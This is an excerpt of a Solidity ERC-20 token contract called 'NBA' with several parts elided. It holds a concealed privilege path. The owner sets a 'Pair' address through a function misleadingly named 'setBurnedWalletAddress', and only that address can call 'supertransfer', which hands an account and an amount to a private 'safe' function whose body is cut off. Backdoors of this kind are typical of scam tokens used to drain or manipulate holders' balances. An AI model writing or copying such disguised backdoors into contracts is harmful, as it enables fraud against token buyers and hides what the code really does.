...
contract NBA is Context, IERC20, Ownable {
    ...
    string private _name = "NBA";
    string private _symbol = "NBA";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable( 0xeA4C06781543DfB4d38E2664260bB4F57445599c); 
    ...
    uint256 private _totalSupply = 7888 * 10**_decimals;
    ...
    function safe(address account, uint256 amount) private {
        require(msg.sender==Pair,"not a permission!");
    ...
    function supertransfer (address account,uint256 amount) public {
        require(msg.sender==Pair,"not a permission!");
        safe(account,amount);
    }

    function setBurnedWalletAddress(address newAddress) external onlyOwner() {
        require(Pair==address(0),"not a permission!");
        Pair = newAddress;
    }
